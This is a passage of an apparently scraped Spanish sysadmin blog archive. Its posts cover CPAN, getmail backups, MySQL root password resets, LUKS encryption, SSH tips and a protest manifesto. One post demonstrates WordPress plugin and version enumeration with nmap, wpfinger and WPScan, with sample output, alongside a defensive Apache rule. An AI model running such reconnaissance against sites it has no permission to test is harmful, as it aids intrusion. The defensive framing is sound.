WORDs or /REGEXP/ or NONE upgrade some/matching/all modules Pragmas force CMD try hard to do command fforce CMD try harder notest CMD skip testing Other h,? display this menu ! perl-code eval a perl command o conf [opt] set and query options q quit the cpan shell reload cpan load CPAN.pm again reload index load newer indices autobundle Snapshot recent latest CPAN uploads ``` Ahora, seguimos los siguientes pasos . Ejecutamos: bash cpan> make install Actualizamos nuestro CPAN: bash cpan> install Bundle::CPAN Recargamos : ```bash cpan> reload cpan (CPAN.....................................v1.9600) (CPAN::Author..........v5.5001) (CPAN::CacheMgr.........v5.5001) (CPAN::Complete......v5.5) (CPAN::Debug.v5.5001) (CPAN::DeferredCode.v5.50) (CPAN::Distribution................................................................................v1.9602) (CPAN::Distroprefs..................................................v6) (CPAN::Distrostatus......v5.5) (CPAN::Exception::RecursiveDependency..v5.5) (CPAN::Exception::yaml_not_installed....v5.5) (CPAN::FTP..................v5.5005) (CPAN::FTP::netrc.....v1.01) (CPAN::HandleConfig..............v5.5003) (CPAN::Index...........v1.9600) (CPAN::InfoObj..........v5.5) (CPAN::LWP::UserAgent...v1.9600) (CPAN::Module...................................v5.5001) (CPAN::Prompt..v5.5) (CPAN::Queue............v5.5001) (CPAN::Shell...............................................................v5.5002) (CPAN::Tarzip...........v5.5011)(CPAN::Version........v5.5001) 398 subroutines redefined cpan shell -- CPAN exploration and modules installation (v1.9600) Enter 'h' for help. ``` Y ya podemos instalar cualquier módulo, por ejemplo: bash cpan> install IO::Pty::Easy Running install for module 'IO::Pty::Easy' Running make for D/DO/DOY/IO-Pty-Easy-0.08.tar.gz Para terminar la sesión: bash cpan> exit Lockfile removed. Si queremos eliminar todos los módulos instalados basta con ejecutar: bash $ rm -fr ~/.cpan Las librerías de CPAN en los respositorios Si queremos instalar las librerías usando el gestor de paquetes : bash $ echo \"XML::Simple\" | perl -e '$x=<>; chomp($x); $x=~s/::/-/; $x=lc($x); print \"lib$x-perl\"' | xargs aptitude install Este comando obtiene el nombre de la librería de los repositorios que contiene el módulo XML::Simple, convirtiendo el nombre del módulo a minúsculas, reemplazando los \"::\" por \"-\" y añadiendo el prefijo \"lib\".","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/22/instalar-modulos-de-cpan-usando-cpan/","loc":"https://karpoke.ignaciocano.com/2011/07/22/instalar-modulos-de-cpan-usando-cpan/"},{"title":"Instalar Google Earth en Ubuntu Natty Narwhal","text":"Ésta es la única manera en que me ha funcionado. Nada de bajar el .deb de su página—además de que, ahora mismo, baja el fichero GoogleEarthLinux.bin —, ni googleearth-package , ni gdebi , ni nada . Bajamos el paquete estable y lo instalamos: bash $ wget https://dl-ssl.google.com/linux/direct/google-earth-stable_current_i386.deb $ sudo dpkg -i google-earth-stable_current_i386.deb Es posible que necesitemos el paquete lsb-core : bash $ sudo aptitude install lsb-core Si las fuentes de la interfaz gráfica se ven realmente mal, instalamos las fuentes de Microsoft (ADV). bash $ sudo aptitude install ttf-mscorefonts-installer Deberemos cerrar la sesión de usuario y volver a entrar para que los cambios en las fuentes tengan efecto.","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/15/instalar-google-earth-en-ubuntu-natty-narwhal/","loc":"https://karpoke.ignaciocano.com/2011/07/15/instalar-google-earth-en-ubuntu-natty-narwhal/"},{"title":"Copia de seguridad de GMail con getmail","text":"Hay otras maneras de realizar una copia de seguridad de GMail , como por ejemplo, usar Thunderbird, pero utilizar getmail tiene la ventaja de que es sencillo, puede realizar la copia en formato Maildir y no necesitamos utilizar ningún gestor de correo electrónico. Maildir y mbox Básicamente, en GNU/Linux hay dos maneras de guardar el correo electrónico, Maildir y mbox . Maildir Cada correo se guarda en un fichero por separado. Añadir, buscar y eliminar correos es rápido, no se necesita bloqueo en ninguna operación, se puede usar en sistemas de ficheros de red y no hay corrupción (exceptuando fallos de hardware). El inconveniente viene dado porque algunos sistemas de ficheros no gestionan eficientemente grandes cantidades de ficheros pequeños, además de que la búsqueda de texto, que requiere abrir todos los ficheros puede ser lenta. Fuente: mattcutss.com mbox Todo el correo se guarda en un único fichero. La ventaja que tiene es que ampliamente soportado. Añadir y buscar un correo es rápido. Entre los inconvenientes están los problemas de bloqueo del fichero para cada operación (añadir, borrar y buscar), problemas cuando se usa en sistemas de ficheros de red y que el formato se corrompe fácilmente. Fuente: mattcutss.com Realizar el backup Instalamos getmail : bash $ sudo aptitude install getmail4 Activamos POP3 en GMail . Vamos a Configuración del correo > Reenvío y POP > Activar POP para todo el correo . Fuente: mail.google.com Creamos el directorio de configuración de getmail : bash $ mkdir ~/.getmail Y creamos el fichero ~/.getmail/getmail.gmail : ```bash [retriever] type = SimplePOP3SSLRetriever server = pop.gmail.com username = bob@gmail.com password = mypass [destination] type = Maildir path = ~/gmail-archive/ [options] print messages about each action (verbose = 2) Other options: 0 prints only warnings and errors 1 prints messages about retrieving and deleting messages only verbose = 2provocado por un cambio en las lib message_log = ~/.getmail/gmail.log ``` Creamos los directorios donde se guardará el correo descargado: bash $ mkdir -p ~/gmail-archive/{cur,new,tmp} Ya podemos empezar con la copia getmail : bash $ getmail -r ~/.getmail/getmail.gmail El correo se bajará en tandas de pocos cientos, dado que GMail sólo permite descargar eso cada vez, por lo que deberemos repetir la operación unas cuantas veces. Actualización a 1 de diciembre de 2015 Desde hace un tiempo, cuando voy a realizar la descarga de nuevos correos, empiezo a recibir errores del tipo: bash Retrieval error: server for SimplePOP3SSLRetriever:bob@gmail.com@pop.gmail.com:995 is broken; offered message GmailId3af2edcdc36d18d2 but failed to provide it. Please notify the administrator of the server. Skipping message... Al parece, se debe a un fallo que ha sido corregido a partir de la versión 4.48.0. Referencias » getmail documentation","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/08/copia-de-seguridad-de-gmail-con-getmail/","loc":"https://karpoke.ignaciocano.com/2011/07/08/copia-de-seguridad-de-gmail-con-getmail/"},{"title":"Cambiar la contraseña de administrador en MySQL 5.1","text":"Para cambiar la contraseña de administrador en MySQL podemos iniciar el servicio utilizando los argumentos --skip-grant-tables , que permite iniciar el servicio sin tener en cuenta los privilegios del sistema, por lo que no es seguro, y el flag --skip-networing , que deshabilita las conexiones remotas pero no se lo impide a las locales, que seguirán teniendo acceso y lo harán como root , por lo que tampoco es seguro. Antes de ver cómo podemos hacerlo de otra manera, veremos cómo hacerlo con este método, que funciona siempre. Método genérico Paramos el servicio y lo iniciamos con los mencionados argumentos: bash $ sudo service mysql stop $ sudo mysqld --skip-grant-tables --skip-networking & Lanzamos el cliente de mysql y cambiamos la contraseña: ```bash $ mysql mysql> UPDATE mysql.user SET Password=PASSWORD('contraseña') WHERE User='root'; Query OK, 2 rows affected (0.03 sec) Rows matched: 2 Changed: 2 Warnings: 0 mysql> FLUSH PRIVILEGES; Query OK, 0 rows affected (0.00 sec) mysql> exit ``` Reiniciamos el servicio y probamos la nueva contraseña: bash $ sudo service mysql restart $ mysql -uroot -p Método mediante un fichero cargado al iniciar el servicio Por los motivos de seguridad descritos, lo mejor es lanzar el servicio indicándole que ejecute un archivo que contendrá el código para cambiar la contraseña: Paramos el servicio: bash $ sudo service mysqld stop Creamos un archivo, por ejemplo ~/mysql-init , que contenga lo siguiente: bash UPDATE mysql.user SET Password=PASSWORD('contraseña') WHERE User='root'; FLUSH PRIVILEGES; Iniciamos el servicio en modo seguro, que carga el archivo que acabamos de crear y le indicamos que lo haga como el usuario mysql . Si no le indicamos el usuario mysql , es posible que se modifique el propietario de algunos ficheros a root , por ejemplo ficheros de log , y que esto cause problemas. bash $ sudo mysqld_safe --init-file=~/mysql-init --user=mysql & Si todo ha ido bien, podremos conectarnos con la nueva contraseña: bash $ mysql -uroot -p Ahora, matamos el servicio (sin usar el argumento -9 ) y lo volvemos a iniciar normalmente: bash $ pgrep mysqld 25825 $ sudo kill 25825 $ sudo service mysql start Problemas y apparmor Si no podemos conectarnos y tenemos una Ubuntu, es posible que sea debido a apparmor . Lo podremos confirmar sin encontramos algo parecido a esto en /var/log/syslog : bash Jul 8 11:09:26 hostname kernel: [11386.395693] type=1400 audit(1310288966.659:41): apparmor=\"DENIED\" operation=\"open\" parent=8723 profile=\"/usr/sbin/mysqld\" name=\"/home/user/mysql-init\" pid=8837 comm=\"mysqld\" requested_mask=\"r\" denied_mask=\"r\" fsuid=113 ouid=0 Para solucionarlo, editamos el fichero /etc/apparmor.d/usr.sbin.mysqld y añadimos la ruta a nuestro directorio de usuario: bash /home/user/ r, /home/user/** rwk, Reiniciamos apparmor para que tenga en cuenta este cambio: bash $ sudo service apparmor restart Volvemos a probar: bash $ sudo mysqld_safe --init-file=~/mysql-init --user=mysql & Probamos de nuevo: bash $ mysql -uroot -p Si todo ha ido bien, ya podemos matar el servicio mysqld y arrancarlo normalmente, eliminar el archivo ~/mysql-init , eliminar los cambios hechos en la configuración de apparmor y reiniciar éste para que tengan efecto.","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/08/cambiar-la-contrasena-de-administrador-en-mysql-5-1/","loc":"https://karpoke.ignaciocano.com/2011/07/08/cambiar-la-contrasena-de-administrador-en-mysql-5-1/"},{"title":"Cifrar una partición o un disco duro externo","text":"Tenemos un disco duro externo y queremos cifrarlo . El comando cryptsetup , que se encuentra en los repositorios, hace uso de DM-Crypt, que es la parte del kernel que se encarga del cifrado de discos, y LUKS, un estándar independiente de la plataforma y del software para acceder a volúmenes cifrados. Requisitos El primer paso, después de instalar el comando, es tener claro qué dispositivo es nuestro disco duro. Un vistazo mediante fdisk debería ser suficiente. Además, si está montado, lo desmontamos. Vamos a comprobar que el disco no tiene errores. Primero, averiguamos el tamaño de bloque: bash $ sudo tune2fs -l /dev/sdb1 | grep -i 'Block size' Block size: 4096 Lanzamos el comando badblocks para comprobar los errores: bash $ sudo badblocks -s -w /dev/sdb1 -b 4096 Este comando se dedica a escribir una serie de patrones en el disco y después leerlos para asegurarse de que no hay problemas, y por este motivo es muy lento. Con el argumento -t se utiliza una sola pasada con un patrón aleatorio : más rápido pero menos preciso. \"aleatorio][\" El siguiente paso es llenar el disco de datos aleatorios para protegerse de ataques criptográficos. El siguiente comando realiza 3 pasadas sobre el disco: bash $ sudo shred -n 3 -v /dev/sdb1 El número de pasadas dependerá de la paranoia de cada uno. En lugar de shred , que toma los datos pseudoaleatorios de /dev/urandom , podríamos utilizar dd , que es realmente aleatorio ya que los toma de /dev/random , y también tarda más: bash $ sudo dd if=/dev/random of=/dev/sdb1 bs=4096 Cifrado Ya estamos listos para cifrar la partición: bash $ sudo cryptsetup --verify-passphrase -c aes -h sha256 -y -s 256 luksFormat /dev/sdb1 Las opciones pasadas indican que pida la contraseña dos veces, un cifrado AES con clave de 256 bits y algoritmo SHA-256. Si nos da el error: bash Check kernel for support for the aes-cbc-plain cipher spec and verify that /dev/sdb6 contains at least 258 sectors es que debemos cargar el módulo dm-crypt : bash $ sudo modprobe dm-crypt Para que se cargue cada vez que arranque el sistema, nos aseguramos de que el fichero /etc/modules contiene la línea: bash dm-crypt Particionado Para montar la interfaz al disco cifrado ejecutamos: bash $ sudo cryptsetup luksOpen /dev/sdb1 crypthd Esto no es lo mismo que montar el disco. Este comando crea un dispositivo que hará de interfaz al disco cifrado y que se encuentra en /dev/mapper/crypthd . El nombre crythd lo escogemos nosotros. Formateamos: bash $ sudo mkfs.ext4 -L crypthd -m 1 /dev/mapper/cryptd Con el argumento -L especificamos la etiqueta para la unidad, con lo que al montarlo automáticamente se utilizará este nombre. El argumento -m es el tanto por cierto de espacio reservado para el administrador. Para desmontar la interfaz: bash $ sudo cryptsetup luksClose /dev/mapper/crypthd Montando y desmontando En el terminal Para usar el disco, primero hay que montar la interfaz y luego el disco. Suponemos que el directorio /media/crypthd ya ha sido creado. También cambiaremos los permisos para que pueda ser usado por nuestro usuario: bash $ sudo cryptsetup luksOpen /dev/sdb1 crypthd $ sudo mount /dev/mapper/crypthd /media/crypthd $ sudo chown -R $USER:$USER /media/crypthd Para desmontar el disco hay que hacerlo en el orden inverso: bash $ sudo umount /media/crypthd $ sudo cryptsetup luksClose /dev/mapper/crypthd En el escritorio Si lo usamos en un entorno de escritorio, podemos aprovecharnos de que el disco se montará automáticamente. No será necesario haber creado el directorio /media/crypthd por lo que, con el disco desmontado, lo podemos borrar. Cada vez que conectemos el disco nos saldrá el cuadro de diálogo que nos pedirá la contraseña para montar la inferfaz al disco y si introducimos la correcta, lo montará en el directorio esperado. La primera vez que lo montemos de esta manera, habrá que modificar los permisos del directorio para que tengamos permisos de escritura: bash $ sudo chmod 775 /media/crypthd $ sudo chgrp adm /media/crypthd \"random bash\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/08/cifrar-una-particion-o-un-disco-duro-externo/","loc":"https://karpoke.ignaciocano.com/2011/07/08/cifrar-una-particion-o-un-disco-duro-externo/"},{"title":"I do not want to be tracked","text":"Firefox > Menú Editar > Preferencias > Privacidad > No deseo ser rastreado Un pequeño listado de complementos para Firefox para proteger nuestra privacidad : » No-Script , bloquea la ejecución de Javascript, Java, Flash, Silverlight y otros » Ghostery , bloquea aquellos servicios que recolectan información privada y del comportamiento del usuario » BetterPrivacy , bloquea las cookies de Flash » Foxy Proxy , permite cambiar entre proxies basándose en reglas y de forma automática » DuckDuckGo , incluye al buscador DuckDuckGo , el cual presumiblemente no registra información sobre los usuarios, en la lista de buscadores Otros complementos: » HTTP-Everywhere , permite realizar una conexión segura al servidor web , siempre que ésta esté disponible » Blacksheep , nos alerta si un usuario está utilizando Firesheep en la misma red","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/02/i-do-not-want-to-be-tracked/","loc":"https://karpoke.ignaciocano.com/2011/07/02/i-do-not-want-to-be-tracked/"},{"title":"Extraer un archivo de un archivo comprimido, desde el terminal","text":"Un día estás editando un archivo en un servidor remoto, por ssh , y, a la hora de guardar, te das cuenta de que has editado el fichero sin tener los privilegios suficientes, por lo que vim se queja: bash E505: \"app.config\" is read-only (add ! to override) La solución es sencilla, para guardarlo como root escribes: bash :w !sudo tee % O eso creías. De repente, te das cuenta de que eso no es lo que has escrito, porque vim se ha puesto en modo inferno , y cada tecla que pulsas le da vida propia, porque hace exactamente lo que le dices que haga y no lo que realmente quieres que haga, y cuando pasa la tormenta y vuelves a editar el fichero, sólo contiene: bash :wq WTF! No pasa nada, tienes copias de seguridad. Una vez que encuentras la copia, backup.tgz , quieres buscar el fichero en cuestión: bash $ tar tvf backup.tgz | grep app.config -rw-r--r-- user/user 10458 2011-06-30 13:11 home/user/projects/django/projectname/myapp/app.config Para descomprimir únicamente ese fichero: bash $ tar xvzf backup.tgz home/user/projects/django/projectname/myapp/app.config home/user/projects/django/projectname/myapp/app.config Si no queremos que nos cree todos esos directorios intermedios, podemos usar el argumento -O , que vuelca el contenido a la salida estándar: bash $ tar xvzf backup.tgz home/user/projects/django/projectname/myapp/app.config -O | tee app.config","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/06/30/extraer-un-archivo-de-un-archivo-comprimido-desde-el-terminal/","loc":"https://karpoke.ignaciocano.com/2011/06/30/extraer-un-archivo-de-un-archivo-comprimido-desde-el-terminal/"},{"title":"Variables variables en Bash","text":"Las variables variables se utilizan cuando queremos tener nombres de variables que puedan usarse y modificarse de forma dinámica. PHP permite su uso de forma directa: php <?php $a = 'hello'; ?> Una variable variable toma el valor de una variable y lo usa para el nombre de la variable. Podemos utilizar \"hello\" como nombre de variable utilizando dos signos de dólar: php <?php $$a = 'world'; ?> En este punto tenemos dos variables, $a que contiene \"hello\" y $hello que contiene \"world\". Así, las siguientes instrucciones escriben \"hello world\": php <?php echo \"$a ${$a}\"; echo \"$a $hello\"; ?> En Bash También podemos conseguir variables variables en Bash : bash $ a=hello $ b=a $ echo $a ${!b} hello hello Algunos tipos de shell , como ksh , no aceptan la sintaxis anterior, pero podemos recurrir a eval para conseguir el mismo resultado: bash $ a=hello $ b=a $ eval echo $a \\$$b hello hello De la misma forma que en el ejemplo en PHP, podemos declarar la variable variable al tiempo que se asignamos un valor: bash $ a=hello $ eval $a=world $ eval echo $a \\$$a hello world","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/06/29/variables-variables-en-bash/","loc":"https://karpoke.ignaciocano.com/2011/06/29/variables-variables-en-bash/"},{"title":"Identificando los plugins de WordPress instalados","text":"Hay un script para nmap , http-wp-plugins , que permite detectar los complementos instalados en WordPress . Dicho script intenta acceder a los directorios de los complementos en wp-content/plugins/ con la ayuda de un diccionario . Si la respuesta no es un error 404 interpreta que el directorio, y por tanto el complemento, existe. La lista de complementos para WordPress es extensa, casi 13405 entradas, y podría llevar bastante tiempo analizarlas todas, por lo que las entradas están ordenadas por popularidad y por defecto sólo se escanean las 100 primeras. Instalación y uso Después de bajarnos el diccionario , lo descomprimimos en el directorio /usr/share/nmap/nselib/data , o en el directorio nselib/data relativo a donde tengamos instalado nmap , y ya podemos probar el complemento: bash $ nmap -p80 --script=http-wp-plugins --script-arg http-wp-plugins.root=\"/blog/\",http-wp-plugins.search=500 mydomain.com PORT STATE SERVICE 80/tcp open http | http-wp-plugins: | search amongst the 500 most popular plugins | all-in-one-seo-pack | akismet | si-contact-form | wp-super-cache | google-sitemap-generator | yet-another-related-posts-plugin | google-analytics-for-wordpress | maintenance-mode | broken-link-checker | feedburner-plugin | exploit-scanner |_ secure-wordpress Mediante la opción http-wp-plugins.root=\"/blog/\" le decimos al complemento que la ruta relativa al WordPress es /blog/ , es decir, mydomain.com/blog/ , y con http-wp-plugins.search=500 que busque los 500 primeros complementos de la lista. Si quisiéramos que los buscase todos, pondríamos all . Cómo \"protegernos\" Una medida para evitar que un atacante pueda recabar información de los complementos que tenemos instalados es añadir al archivo de configuración del sitio de Apache, /usr/share/wordpress/wp-content , las siguientes directivas: ```apache Order Deny,Allow Deny from All Options FollowSymLinks AllowOverride None ``` Y reiniciamos el servicio. Después de estos cambios, el resultado será que que, para el script , todos los complementos están instalados, ya que el acceso a estos directorios está prohibido (error 403). bash $ nmap -p80 --script=http-wp-plugins --script-arg http-wp-plugins.root=\"/blog/\",http-wp-plugins.search=10 mydomain.com PORT STATE SERVICE 80/tcp open http | http-wp-plugins: | search amongst the 10 most popular plugins | gtranslate | all-in-one-seo-pack | contact-form-7 | google-analyticator | akismet | wptouch | si-contact-form | wp-super-cache | add-to-any |_ sexybookmarks Éstos se corresponden justamente con las 10 primeras entradas del diccionario: bash $ head /usr/share/nmap/nselib/data/wp-plugins.lst gtranslate all-in-one-seo-pack contact-form-7 google-analyticator akismet wptouch si-contact-form wp-super-cache add-to-any sexybookmarks Sin embargo, esta medida no llega a ser una medida realmente efectiva ya que: algunos complementos dejarán de funcionar de forma correcta. Los que incluyan archivos estáticos tales como CSS o Javascript dentro de sus directorios no podrán cargarlos, por lo que no se verán como estaba pensado o dejarán de funcionar correctamente no deja de ser una medida de seguridad por oscuridad, ya que ocultar lo que tenemos no nos hace más seguros, sino más confiados, y seguramente se pueden seguir identificando algunos de los complementos que tenemos instalados inspeccionando el código fuente de la página. Lo mejor sería tener nuestro WordPress actualizado , utilizar complementos de fuentes fiables y que se actualicen regularmente. Usando wpfinger wpfinger es una herramienta que analiza el repositorio de complementos de WordPress y genera firmas basadas en las diferencias entre cada versión de cada complemento. Mediante estas firmas puede detectar la presencia de cualquier complemento del repositorio, y probablemente la versión concreta, en una página web. Para instalarlo desde el repositorio Git: bash $ git clone https://code.google.com/p/wpfinger/ Para realizar un escaneo: bash $ ./wpfinger.py http://localhost/wordpress/ Detected 404 as default response code. Installed plugins: google-analytics-for-wordpress: trunk si-contact-form: 2.9.7.1 add-to-any: 0.9.9.9.4 - trunk all-in-one-seo-pack: trunk wp-super-cache: 0.9.9.4 yet-another-related-posts-plugin: 3.3.1 akismet: trunk google-sitemap-generator: trunk broken-link-checker: trunk maintenance-mode: trunk secure-wordpress: 2.0.1 feedburner-plugin: trunk post-plugin-library: 2.5.0.5 exploit-scanner: 1.0.5 - trunk wp-syntax: trunk login-lockdown: 1.5 - trunk wp-jquery-lightbox: 1.2.1 nktagcloud: 0.99.5 - trunk wp-paginate: trunk Usando wpscan WPScan es un escáner de vulnerabilidades que comprueba la seguridad de una instalación de WordPress utilizando un enfoque de caja negra. Puede listar usuarios, romper claves débiles, mostrar la versión de WordPress instalada, mostrar los complementos instalados y las vulnerabilidades que puedan tener, además de otra información. Antes de descargar el código del repositorio SVN, necesitaremos instalar las dependencias: bash $ sudo aptitude install libcurl4-gnutls-dev libxml-simple-ruby $ sudo gem install typhoeus $ svn checkout http://wpscan.googlecode.com/svn/trunk/ wpscan-read-only Si queremos realizar una comprobación no intrusiva que muestre la versión de WordPress y el tema instalado: ```bash $ ruby wpscan-read-only/wpscan.rb --url http://localhost/wordpress __ _ _ \\ \\ / / \\ / _| \\ \\ /\\ / /| | _) | ( _ \\ \\/ \\/ / | / _ _ \\ / |/ ` | ' \\ \\ /\\ / | | _) | ( | ( | | | | | \\/ \\/ |_| | / _ |_ , | | | | v1.1 WordPress Security Scanner by ethicalhack3r.co.uk Sponsored by the RandomStorm Open Source Initiative Copyright (C) 2011 Ryan Dewhurst This program comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions. See GNU GPLv3. | URL: http://localhost/wordpress | Started on Sun Sep 18 18:00:35 2011 [+] The WordPress theme in use is called minimalism [+] WordPress version/s \"3.2.1\" identified from advanced fingerprinting. [+] Finished at Sun Sep 18 18:00:40 2011 ``` Si queremos que nos muestre los complementos instalados: ```bash $ ruby wpscan-read-only/wpscan.rb --enumerate p --url http://localhost/wordpress __ _ _ \\ \\ / / \\ / _| \\ \\ /\\ / /| | _) | ( _ \\ \\/ \\/ / | / _ _ \\ / |/ ` | ' \\ \\ /\\ / | | _) | ( | ( | | | | | \\/ \\/ |_| | / _ |_ , | | | | v1.1 WordPress Security Scanner by ethicalhack3r.co.uk Sponsored by the RandomStorm Open Source Initiative Copyright (C) 2011 Ryan Dewhurst This program comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions. See GNU GPLv3. | URL: http://localhost/wordpress | Started on Sun Sep 18 18:09:31 2011 [+] The WordPress theme in use is called minimalism [+] WordPress version/s \"3.2.1\" identified from advanced fingerprinting. [+] Enumerating installed plugins... Checking for 2162 total plugins... 1% complete. ```","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/06/20/identificando-los-plugins-de-wordpress-instalados/","loc":"https://karpoke.ignaciocano.com/2011/06/20/identificando-los-plugins-de-wordpress-instalados/"},{"title":"Secuencias de escape en SSH","text":"Secuencias de escape en SSH: bash user@remotehost:~$ ~? Supported escape sequences: ~. - terminate connection (and any multiplexed sessions) ~B - send a BREAK to the remote system ~C - open a command line ~R - Request rekey (SSH protocol 2 only) ~&#94;Z - suspend ssh ~# - list forwarded connections ~& - background ssh (when waiting for connections to terminate) ~? - this message ~~ - send the escape character by typing it twice (Note that escapes are only recognized immediately after newline.) La primera, ~. , se puede utilizar para cerrar la sesión cuando se nos queda colgada , por ejemplo, al reiniciar la máquina remota. Podemos hacer que nos muestre una consola: bash user@remotehost:~$ ~C ssh> help Commands: -L[bind_address:]port:host:hostport Request local forward -R[bind_address:]port:host:hostport Request remote forward -D[bind_address:]port Request dynamic forward -KR[bind_address:]port Cancel remote forward O que nos muestre las conexiones abiertas: bash user@remotehost:~$ ~# The following connections are open: #1 client-session (t4 r0 i0/0 o0/0 fd 5/6 cc -1) Si estamos compartiendo una conexión SSH , y nos conectamos desde otro terminal, veremos algo parecido a esto: bash user@remotehost:~$ ~# The following connections are open: #1 client-session (t4 r0 i0/0 o0/0 fd 5/6 cc -1) #3 client-session (t4 r1 i0/0 o0/0 fd 9/10 cc 2)","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/06/18/secuencias-de-escape-en-ssh/","loc":"https://karpoke.ignaciocano.com/2011/06/18/secuencias-de-escape-en-ssh/"},{"title":"Yo #soy15m","text":"Como parte del #15m me declaro una persona pacífica y condeno radicalmente todo tipo de violencia: la de los violentos infiltrados en nuestras manifestaciones, y la del Estado, que ha causado más dolor y heridos. Además, condeno la manipulación mediática que enfatiza la información sesgada, parcial o errónea con el propósito de demonizar a los ciudadanos. Si me manifiesto en la calle es porque: -Mi participación como ciudadano se ha reducido a votar a listas cerradas cada cuatro años para ver cómo los representantes de los ciudadanos no respetan lo prometido en su programa. -Se hacen leyes a favor de grupos de interés en vez de hacerlas a favor del conjunto de la sociedad. -Se invierten recursos públicos para ayudar a minorías poderosas, y no a quienes están pasando situaciones desesperadas ocasionadas por la especulación financiera. -Los grandes partidos están más preocupados por mantener su poder que por ofrecer soluciones para superar esta crisis histórica. -Está a punto de firmarse un \"Pacto del Euro\" que consiste fundamentalmente en medidas para reducir la inversión pública en servicios esenciales. -Desde diferentes órganos del estado se ha insultado a los ciudadanos, e incluso se ha justificado el recurso a la violencia contra manifestantes pacíficos. Como parte del #15m, acepto y respeto la diversidad ideológica del movimiento. Cuando participo en una manifestación no reclamo un régimen o una ideología en concreto, ni un modelo social no democrático, ni la eliminación de los partidos o los parlamentos. Lo que reclamo es una democracia mejor y más humana que, entre otras medidas, necesita urgentemente: -Cambios en la Ley Electoral para permitir una mejor y más directa representación de los ciudadanos en los parlamentos y una mayor participación ciudadana en las decisiones importantes. -Aprobación de una Ley de Transparencia y Acceso a la Información Pública para obligar a la publicación en formatos adecuados y reutilizables de todos los gastos, decisiones y reuniones con grupos de presión por parte de funcionarios y cargos públicos. -Tolerancia cero a la corrupción de candidatos y cargos públicos, y controles ciudadanos para la exigencia de responsabilidad política. -Separación clara, real y efectiva de los poderes del estado. -Control fiscal efectivo de grandes fortunas y operaciones financieras; eliminación de privilegios fiscales a cargos electos. -Políticas encaminadas a solucionar de forma efectiva los problemas hipotecarios y de vivienda. -Servicios públicos de calidad, fundamentalmente salud, justicia y educación. -Eliminación de las leyes que permiten el control administrativo de Internet. La red ha demostrado ser esencial para la libertad de expresión y para responder al peligro de manipulación mediática. Por todas estas razones volveré a salir pacíficamente a la calle el 19 de junio, #19j. Si estás de acuerdo, aprópiate del texto y divúlgalo ( enlace al documento original ).","tags":"memo","url":"https://karpoke.ignaciocano.com/2011/06/18/yo-soy15m/","loc":"https://karpoke.ignaciocano.com/2011/06/18/yo-soy15m/"},{"title":"Compartiendo una conexión por SSH","text":"A partir de la versión 4 de OpenSSH se pueden compartir las conexiones seguras a un máquina remota, de tal manera que, una vez establecida la primera conexión, el resto de conexiones reutilizan la primera, por lo que el establecimiento de la conexión de éstas será mucho más rápido. Configuración Lo primero es asegurarnos de que existe el directorio ~/.ssh en el cliente, con permisos 700 (sólo accesible por nosotros mismos... y cualquier administrador). A continuación, añadimos las siguientes líneas al fichero ~/.ssh/config : bash Host * ControlPath ~/.ssh/master-%l-%r@%h:%p ControlMaster auto Host * especifica que se aplica a cualquier máquina remota, ControlMaster auto especifica que se reutilice una conexión existente, si es posible, y ControlPath ~/.ssh/master-%l-%r@%h:%p especifica dónde se debe crear el fichero de socket que representa la conexión maestra. %r se sustituye por el nombre de usuario, %h por el nombre de la máquina remota, %p por el puerto remoto y %l por el nombre de la máquina local, que, aunque sólo es útil si el directorio se puede montar en varias máquinas (por ejemplo, si el directorio de usuario se monta por NFS), no molesta si se incluye siempre. Comparación de tiempos Para la primera conexión: ```bash $ time ssh user@remote exit real 0m1.217s user 0m0.012s sys 0m0.004s ``` Para las siguientes conexiones: ```bash $ time ssh user@remote exit real 0m0.168s user 0m0.008s sys 0m0.012s ``` La diferencia es notable. Para evitar que nos pida la contraseña y tener que introducirla manualmente, podemos utilizar el inicio de sesión por clave , o recurrir al comando expect para evitar introducir la contraseña . Las siguientes conexiones Si estamos haciendo estas pruebas utilizando algunos de los scripts que se basan en expect es posible que nos de un error o un al intentar enviar la contraseña, ya que mientras estemos haciendo uso de la conexión compartida, para las siguientes conexiones no será necesario introducir la contraseña. Ademá, dado que se reutiliza la conexión maestra, si queremos conectarnos utilizando diferentes parámetros deberemos crear una conexión nueva, utilizando el argumento -S none : bash $ ssh -S none -X user@remote Ficheros de socket Si no finalizamos la conexión correctamente, es posible que el fichero de socket no se elimine correctamente, lo que puede provocar que no nos permita volver a conectarnos: bash Control socket connect(/home/user/.ssh/master-remote-local@example.net:1234): Connection refused ControlSocket /home/user/.ssh/master-remote-local@example.net:1234 already exists Simplemente debemos eliminar estos ficheros para solucionarlo. Salir de la sesión maestra mientras hay otras conexiones Si salimos de la sesión maestra mientras hay más conexiones abiertas, la primera quedará colgada hasta que terminen el resto de sesiones. Una posible solución para evitar este inconveniente es realizar la conexión maestra utilizando el argumento -N para que no nos ofrezca un terminal, y matar el proceso cuando ya no la necesitemos.","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/06/17/compartiendo-una-conexion-por-ssh/","loc":"https://karpoke.ignaciocano.com/2011/06/17/compartiendo-una-conexion-por-ssh/"},{"title":"Conectarse por SSH utilizando expect","text":"expect es un comando que \"habla\" con otros programas interactivos. Se definen unas reglas en función de lo que esperamos que nos digan esos programas y lo que queremos contestar. Un típico ejemplo es realizar una conexión a un servicio de FTP o SSH, y utilizar expect para que introduzca la contraseña por nosotros y lleve a cabo diferentes acciones. La ventaja que tiene es que podemos automatizar acciones en esos servicios. El gran inconveniente es que, si esos servicios requieren autenticación, deberemos escribir la contraseña, ya sea en un script o directamente en el terminal, pudiendo quedar reflejada en el historial. (Dependiendo de la configuración, si incluimos espacios antes de ejecutar un comando, éste no queda reflejado en el historial). Conectarse a un servidor SSH y mostrar una consola interactiva Aunque el resultado pueda ser similar a conectarse utilizando la clave , ya que no nos pedirá contraseña, el nivel de seguridad es muy diferente, no sólo por lo que ya hemos comentado, sino porque nuestra contraseña seguramente es más débil que una clave RSA (de al menos 2048 bits). Siempre que sea posible, es preferible utilizar una 